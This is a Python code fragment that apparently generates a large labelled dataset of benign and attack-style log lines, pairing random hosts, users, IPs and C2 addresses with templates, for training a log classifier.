                h = random.choice(self.hosts)
                user = random.choice(self.users)
                ip = self._random_ip()
                c2_ip = random.choice(self.c2_ips)
                pid = random.randint(100, 65000)

                safe_tmpl, attack_tmpl = self._get_templates(dt, h, user, ip, c2_ip, pid)
                
                logs.append(random.choice(safe_tmpl))
                labels.append(0)
                
                logs.append(random.choice(attack_tmpl))
                labels.append(1)

        return pd.DataFrame({"log": logs, "label": labels})

def get_training_data(n_samples=1000000):
    generator = MillionLogDatasetGenerator()
    return generator.build_dataset(n_samples)